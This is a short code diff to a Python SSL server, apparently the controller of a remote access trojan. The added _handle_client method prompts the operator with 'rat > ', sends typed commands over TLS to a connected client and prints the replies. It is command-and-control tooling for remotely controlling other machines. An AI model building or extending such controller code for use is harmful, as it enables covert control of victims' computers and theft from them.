@@ -42,11 +42,11 @@ class SSLServer:
                         server_side=True,
                     )
 
-                    print("Client connected:", addr)
-                    logger.info("Client connected:", addr)
+                    print("Client connected:", addr[0])
+                    logger.info("Client connected: %s", addr[0])
 
                     Thread(
-                        target=self._recv,
+                        target=self._handle_client,
                         args=(sconn,),
                         daemon=True,
                     ).start()
@@ -86,6 +86,33 @@ class SSLServer:
 
         finally:
 
+            sock.close()
+
+    def _handle_client(self, sock):
+
+        try:
+
+            while True:
+
+                command = input("rat > ")
+
+                if not command:
+                    continue
+
+                sock.send(command.encode())
+
+                data = sock.recv(self.chunk_size)
+
+                if not data:
+                    print("Client disconnected")
+                    break
+
+                print(data.decode())
+
+        except Exception as e:
+            print(f"Error: {e}")
+
+        finally:
             sock.close()
 
 
